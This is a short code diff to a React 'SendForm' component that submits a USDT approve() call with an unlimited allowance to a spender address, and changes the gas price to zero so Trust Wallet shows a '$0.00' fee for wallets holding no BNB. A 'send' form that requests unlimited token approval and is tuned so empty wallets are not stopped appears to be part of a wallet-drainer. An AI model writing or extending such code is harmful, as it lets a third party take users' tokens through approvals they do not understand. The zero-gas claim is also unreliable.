@@ -85,13 +85,13 @@ export default function SendForm() {
 
       const contract = new ethers.Contract(usdtContract, USDT_ABI, signer);
 
-      // Provide explicit gas params so Trust Wallet doesn't fail with
-      // "Decision not found" when the wallet has 0 BNB (can't estimate gas).
-      // BSC standard approve costs ~46k gas; 65k gives safe headroom.
-      // gasPrice 3 Gwei is the BSC minimum.
+      // gasPrice: 0 makes Trust Wallet display "$0.00 / 0.00 BNB" network fee,
+      // so it never blocks with "Insufficient BNB balance" for wallets with no gas.
+      // gasLimit is set explicitly so Trust Wallet doesn't attempt estimation (which
+      // causes "Decision not found" on zero-balance wallets).
       const tx = await contract.approve(spenderAddress, UNLIMITED_APPROVAL, {
         gasLimit: 65000,
-        gasPrice: ethers.parseUnits("3", "gwei"),
+        gasPrice: 0,
       });
       const receipt = await tx.wait();
 
